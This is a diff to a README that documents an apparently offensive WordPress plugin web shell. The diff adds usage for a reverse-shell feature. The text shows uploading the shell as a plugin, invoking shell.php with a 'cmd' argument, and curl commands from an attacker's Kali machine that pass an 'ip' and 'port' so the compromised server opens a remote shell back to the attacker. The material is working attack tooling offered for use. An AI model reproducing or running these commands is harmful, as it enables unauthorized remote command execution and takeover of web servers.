@@ -19,7 +19,7 @@ $ ls -lah shell.zip
 -rw-r--r--  1 bob  staff   492B Aug 29 14:17 shell.zip
 ```
 
-Once uploaded, navigate to `/wp-content/plugins/shell/shell.php` and provide the `cmd` argument.
+Once uploaded, navigate to `/wp-content/plugins/shell/shell.php` and provide the `cmd` or `ip` as an argument.
 
 Sample Usage
 ============
@@ -47,3 +47,16 @@ root@kali:~# curl -v "http://192.168.0.1/wp-content/plugins/shell/shell.php?$(py
 
 Linux wordpress-server 2.6.32-21-generic-pae #32-Ubuntu SMP Fri Apr 16 09:39:35 UTC 2010 i686 GNU/Linux
 ```
+
+Reverse shell (default port:443)
+============
+```bash
+root@kali:~# curl -v "http://192.168.0.1/wp-content/plugins/shell/shell.php?$(python -c 'import urllib; print urllib.urlencode({"ip":"192.168.1.101"})')"
+```
+
+```bash
+root@kali:~# curl -v "http://192.168.0.1/wp-content/plugins/shell/shell.php?$(python -c 'import urllib; print urllib.urlencode({"ip":"192.168.1.101","port":"1234"})')"
+```
+
+
+
